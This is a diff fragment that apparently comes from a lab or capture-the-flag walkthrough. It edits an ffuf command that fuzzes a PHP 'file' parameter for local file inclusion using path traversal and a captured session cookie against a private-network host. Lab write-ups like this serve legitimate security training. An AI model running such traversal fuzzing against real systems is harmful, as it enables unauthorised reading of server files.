@@ -230,7 +230,7 @@ Inspect Page and storage tab -> PHPSESSION ID: 3igpv4q3neckiknb40ou3hrt8o
 
 Use ffuf to fuzz the page using these lists -> /usr/share/seclists/Fuzzing/LFI
 
-ffuf -b 'PHPSESSID=3igpv4q3neckiknb40ou3hrt8o' -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://192.168.1.136/sea.php\?file\=../../../../FUZZ -fw 56
+ffuf -b 'PHPSESSID=3igpv4q3neckiknb40ou3hrt8o' -c -w /seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://192.168.1.136/sea.php\?file\=../../../../FUZZ -fw 56
 
 the ../../../../ can be run with different deepness for different files up to 10
 
